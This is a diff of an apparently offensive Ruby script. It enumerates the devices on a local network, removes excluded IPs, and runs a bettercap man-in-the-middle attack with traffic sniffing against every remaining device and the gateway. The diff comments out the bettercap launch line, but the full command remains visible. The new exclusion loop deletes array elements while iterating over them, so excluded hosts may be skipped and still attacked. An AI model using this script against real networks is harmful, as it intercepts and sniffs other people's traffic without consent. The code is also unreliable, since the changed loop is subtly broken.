@@ -19,8 +19,11 @@ else
 end
 
 #EXCLUDED IP
-excluded_devices=config['EXCLUDED_DEVICES']
 
+excluded_devices=Array.new
+config['EXCLUDEDDEVICES'].each do |s|
+	excluded_devices << s
+end
 #CHECK FORM REQUIRED SOFTWARE INSTALLATION
 #check for bettercap installation
 
@@ -58,12 +61,22 @@ puts "---- DEVICE LIST----"
 Devices.each{|a| puts a}
 
 puts "cleaning Device list..."
-Devices.delete_if{|device| excluded_devices.include? (device.ip)}
+excluded_devices.each{|dev| puts dev}
+
+
+
+Devices.each do |device|
+	excluded_devices.each do |exc_dev|
+		if device.ip == exc_dev
+			Devices.delete(device)
+		end
+	end	
+end
 
 puts "---- NEW DEVICES LIST----"
 Devices.each{|a| puts a}
 
 puts " Performing MITM attack against all device and the gateway"
-Devices.each{ |device| fork{exec("sudo bettercap -G "+gateway_ip+" --target "+device.ip.to_s+" --no-discovery  --sniffer")}  }
+#Devices.each{ |device| fork{exec("sudo bettercap -G "+gateway_ip+" --target "+device.ip.to_s+" --no-discovery  --sniffer")}  }
 
 #fork{exec("ls")}
